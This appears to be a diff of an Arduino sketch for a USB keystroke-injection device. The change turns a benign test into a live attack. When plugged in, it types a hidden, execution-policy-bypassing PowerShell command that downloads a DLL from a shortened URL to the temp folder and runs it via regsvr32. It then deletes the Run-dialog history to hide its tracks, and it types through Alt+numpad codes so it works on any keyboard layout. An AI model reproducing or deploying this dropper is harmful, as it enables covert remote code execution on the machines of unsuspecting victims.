@@ -1,22 +1,22 @@
-#include <Keyboard.h>
+#define HID_CUSTOM_LAYOUT
+#define LAYOUT_US_ENGLISH
+#include "HID-Project.h"
+
 void setup()
 {
-
   Keyboard.begin();
-
-  delay(500);
-  delay(2000);
+  delay(1500);
 
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press(114);
   Keyboard.releaseAll();
 
   delay(500);
+  
+  typeString("powershell powershell -NoP -NonI -ExecutionPolicy ByPass -W Hidden \"IEX (new-object System.Net.WebClient).DownloadFile('https://shorturl.at/FIT56','%TEMP%/xd.dll'); regsvr32 %TEMP%/xd.dll\"");
+  Keyboard.write(KEY_RETURN);
 
-  Keyboard.print("powershell powershell -NoP -NonI -ExecutionPolicy ByPass -W Hidden \"IEX (new-object System.Net.WebClient).DownloadFile('http://www.google.com','%TEMP%/google.html'); %TEMP%/google.html\"");
-  typeKey(KEY_RETURN);
-
-  delay(300);
+  delay(100);
 
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press(114);
@@ -24,14 +24,28 @@ void setup()
   
   delay(500);
 
-  Keyboard.print("powershell powershell Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU' -Name '*' -ErrorAction SilentlyContinue");
-  typeKey(KEY_RETURN);
+  typeString("powershell powershell Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU' -Name '*' -ErrorAction SilentlyContinue");
+  Keyboard.write(KEY_RETURN);
 }
-
-void typeKey(int key)
-{
-  Keyboard.press(key);
-  delay(50);
-  Keyboard.release(key);
+void typeString(String str) {
+  for (int i = 0; i < str.length(); i++) {
+    char c = str.charAt(i);
+    int code = (int)c;
+    // Press left alt key
+    Keyboard.press(KEY_LEFT_ALT);
+    // Press each digit of the ASCII code separately using numpad keys
+    String asciiString = String(code);
+    for (int j = 0; j < asciiString.length(); j++) {
+      int digit = (int)asciiString.charAt(j);
+      if (digit == '0'){
+        Keyboard.write(KeyboardKeycode(98));
+      }
+      else {
+        Keyboard.write(KeyboardKeycode(88 + digit - 48));
+      }
+    }
+    // Release all keys
+    Keyboard.releaseAll();
+  }
 }
 void loop(){}
